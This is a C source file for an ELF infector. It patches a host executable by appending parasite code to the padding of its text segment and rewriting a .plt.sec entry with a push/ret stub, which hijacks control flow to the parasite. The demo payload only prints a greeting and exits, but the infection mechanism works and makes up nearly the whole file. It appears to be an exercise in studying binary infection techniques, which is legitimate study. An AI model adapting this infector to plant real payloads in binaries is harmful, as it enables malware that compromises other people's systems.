/* plt_redirection_infect.c 
 * redirect the PLT entry to hijack the control flow.
 * Our code was parasited in the padding area of text segment.
 * Usage: ./plt_redirection_infect <host_file> 
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdint.h>
#include <elf.h>
#include <fcntl.h>
#include <string.h>

typedef struct _handle_t
{
    uint8_t *mem;
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    char *shrtable;
}handle_t;

static volatile inline void 
_write(int, char *, unsigned int)__attribute__((aligned(8), __always_inline__));

static volatile inline void
_write(int fd, char *buffer, unsigned int len)
{
    __asm__ volatile(
        /* write(1, "[I'm in here]\n", 14) */
        "mov %0, %%edi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%edx\n"
        "mov $1, %%rax\n"
        "syscall\n"
        
        /* exit(0) */
        "mov $0, %%edi\n"
        "mov $60, %%rax\n"
        "syscall\n"
        : 
        : "g"(fd), "g"(buffer), "g"(len)
    );
}

void parasite_greeting()
{
    char str[] = {'[', 'I', '\'', 'm', 
    ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
    _write(1, str, 14);
    
    /*
    __asm__ volatile(
        "mov $0x401178, %%rax\n"
        "jmp *%%rax\n"
        :
        : 
    );
    */
}

uint8_t *create_shellcode(void (*fn)(),size_t len)
{
    int i;
    uint8_t *mem = malloc(len);
    uint8_t *ptr = (uint8_t *)fn;
    for(i = 0; i < len; i++) mem[i] = ptr[i];
    return mem;
}

uint64_t f1 = (uint64_t)parasite_greeting;
uint64_t f2 = (uint64_t)create_shellcode;

int main(int argc, char *argv[])
{
    if(argc < 2)
    {
        printf("Usage: %s <exec_file>\n", argv[0]);
        exit(-1);
    }
    handle_t h;
    size_t parasite_len = ((f2 - f1) + 7) & (~7);
    uint8_t *parasite_code = create_shellcode(parasite_greeting, parasite_len);

    char *file_name = strdup(argv[1]);
    int fd;
    if((fd = open(file_name, O_RDWR)) < 0)
    {
        perror("open");
        exit(-1);
    }
    struct stat st;
    if(fstat(fd, &st) < 0)
    {
        perror("fstat");
        exit(-1);
    }
    h.mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    
    if(h.mem == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }
    
    h.ehdr = (Elf64_Ehdr *)h.mem;
    h.phdr = (Elf64_Phdr *)&h.mem[h.ehdr->e_phoff];
    h.shdr = (Elf64_Shdr *)&h.mem[h.ehdr->e_shoff];
    
    Elf64_Off parasite_offset;
    Elf64_Addr parasite_entry;
    int i;
    for(i = 0; i < h.ehdr->e_phnum; i++)
    {
        if((h.phdr[i].p_type == PT_LOAD) && (h.phdr[i].p_flags == PF_R + PF_X))
        {
            parasite_offset = h.phdr[i].p_offset + h.phdr[i].p_filesz; 
            parasite_entry = h.phdr[i].p_vaddr + h.phdr[i].p_memsz;
            h.phdr[i].p_filesz += parasite_len;
            h.phdr[i].p_memsz += parasite_len;
        }
    }

    h.shrtable = &h.mem[h.shdr[h.ehdr->e_shstrndx].sh_offset];
    
    size_t hijack_offset;

    for(i = 0; i < h.ehdr->e_shnum; i++)
    {
        if(h.shdr[i].sh_offset + h.shdr[i].sh_size == parasite_offset)
            h.shdr[i].sh_size += parasite_len;
        if(strcmp(&h.shrtable[h.shdr[i].sh_name], ".plt.sec") == 0)
        {
            hijack_offset = h.shdr[i].sh_offset + h.shdr[i].sh_entsize + 4;
            printf("Got the .plt.sec offset at %lx\n", hijack_offset);
        }
    }
    uint8_t *hijack_code = {"\x68\x00\x00\x00\x00\xc3\x90"};
    
    if(lseek(fd, 0, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, h.mem, sizeof(Elf64_Ehdr) + h.ehdr->e_phentsize * h.ehdr->e_phnum) < 0)
    {
        perror("write");
        exit(-1);
    }
    if(lseek(fd, hijack_offset, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, hijack_code, 7) < 0)
    {
        perror("write");
        exit(-1);
    }
    if(lseek(fd, hijack_offset + 1, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, &parasite_entry, 4) < 0)
    {
        perror("write");
        exit(-1);
    }
    if(lseek(fd, parasite_offset, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, parasite_code, parasite_len) < 0)
    {
        perror("write");
        exit(-1);
    }
    if(lseek(fd, h.ehdr->e_shoff, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, h.shdr, h.ehdr->e_shentsize * h.ehdr->e_shnum) < 0)
    {
        perror("write");
        exit(-1);
    }
    close(fd);
    return 0;
}